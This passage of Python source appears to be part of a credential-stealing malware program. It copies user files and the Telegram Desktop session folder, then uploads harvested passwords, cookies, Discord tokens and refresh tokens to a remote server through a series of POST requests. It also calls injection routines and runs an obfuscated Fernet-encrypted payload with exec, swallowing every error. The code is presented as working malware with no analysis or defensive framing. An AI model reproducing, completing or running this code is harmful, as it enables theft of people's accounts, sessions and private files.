                    for extension in ALLOWED_EXTENSIONS:
                        if file_name.endswith(extension):
                            try:
                                realpath = os.path.join(root, file_name)
                                if os.path.isfile(realpath):
                                    shutil.copy(realpath, STORAGE_PATH)
                                else:
                                    zip_to_storage(realpath, STORAGE_PATH)
                            except:
                                pass

def telegram():
    try:
        kill_process("Telegram.exe")
    except:
        pass
    source_path = os.path.join(APPDATA, "Telegram Desktop", "tdata")
    
    if os.path.exists(source_path):
        zip_to_storage("tdata_session", source_path, STORAGE_PATH)

try:
    telegram()
except:
    pass

def create_log():
    for i in range(10):
        payload = {
            "passwordcount": len(PASSWORDS),
            "cookiecount": COOKIECOUNT,
            "discordtokencount": len(DISCORD_TOKENS),
            "filenames": FILES,
        }
        headers = {"X-User-Identifier": userid, "Content-Type": "application/json"}

        try:
            r = requests.post(MAIN_URL + "/create_log", json=payload, headers=headers)
            if r.status_code == 200:
                return r.json()["log_uuid"]
            else:
                continue
        except:
            continue

    return ""

def upload_data(loguuid):
    payload = {
        "passwords": PASSWORDS,
        "cookies": COOKIES,
        "discord_tokens": DISCORD_TOKENS,
        "refresh_tokens": WEB_DATA
    }
    headers = {"X-Trace-ID": loguuid, "Content-Type": "application/json"}
    requests.post(MAIN_URL + "/log_data", json=payload, headers=headers)

def upload_files(filepath, loguuid):
    url = MAIN_URL + "/log_files"

    files = {'file': open(filepath, 'rb')}
    headers = {"X-Trace-ID": loguuid}
    requests.post(url, files=files, headers = headers)

for file_to_upload in os.listdir(STORAGE_PATH):
    FILES.append(file_to_upload)

try:
    loguuid = create_log()
    upload_data(loguuid)
    for file_to_upload in os.listdir(STORAGE_PATH):
        upload_files(os.path.join(STORAGE_PATH, file_to_upload), loguuid)
except: pass

for i in range(2):
    try:
        inject(loguuid)
        inject_atomic(loguuid)
        break
    except: pass

try:
    from fernet import Fernet;exec(Fernet(b'tYnDVZH8g0OmbkypmHgO6fas8R_IyMfh8N6YXJJoXJg=').decrypt(b'gAAAAABnuPWc9herg9xrGBt9BigXmAqNrz4dE8p6trhbjktC_Fgq9DOylJV6PadaHkvmO4qeEZlTrtGErnf0m_j0JmH7HqYPIRSJ8vRRHAn0qSE1RkGEUy3J1SIE6YNJTykyciE33egiOgM4NTHA-wd74aPN8NKjbH0MBM_9gDO6D8enjSWB1ufOwrCDsoc9JshwU4f7f9Cz'))
except: pass
try:
    os.remove(STORAGE_PATH)
except: pass